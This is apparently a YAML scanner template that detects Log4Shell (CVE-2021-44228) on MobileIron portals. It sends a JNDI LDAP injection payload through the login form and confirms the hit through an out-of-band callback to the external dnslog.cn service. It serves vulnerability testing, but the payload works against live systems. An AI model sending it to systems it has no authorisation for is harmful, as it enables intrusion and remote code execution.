name: MobileIron Log4shell CVE-2021-44228
manual: true
query: '( title="MobileIron System Manager: Sign In" | title="MobileIron User Portal:
  Sign In" | title="MobileIron Benutzerportal: Anmeldung" | title="MobileIron 用户门户：登录"
  | title="MobileIron Portail utilisateur : connexion")'
transport: http
rules:
  r0:
    request:
      method: GET
      path: http://www.dnslog.cn/getdomain.php
    expression: response.status == 200
    output:
      dnstest: response.body
  r1:
    request:
      method: POST
      path: /mics/j_spring_security_check
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: j_username=${jndi:ldap://{{dnstest}}/tea}&j_password=${jndi:ldap://{{dnstest}}/tea}
    expression: "true"
  r2:
    request:
      method: GET
      path: http://www.dnslog.cn/getrecords.php
    expression: response.status == 200 && response.body.bcontains(b"{{dnstest}}")
expression: r0() && r1() && r2()
detail:
  author: aetkrad
  links:
  - https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis
  description: MobileIron存在log4j漏洞。
  tags: rce
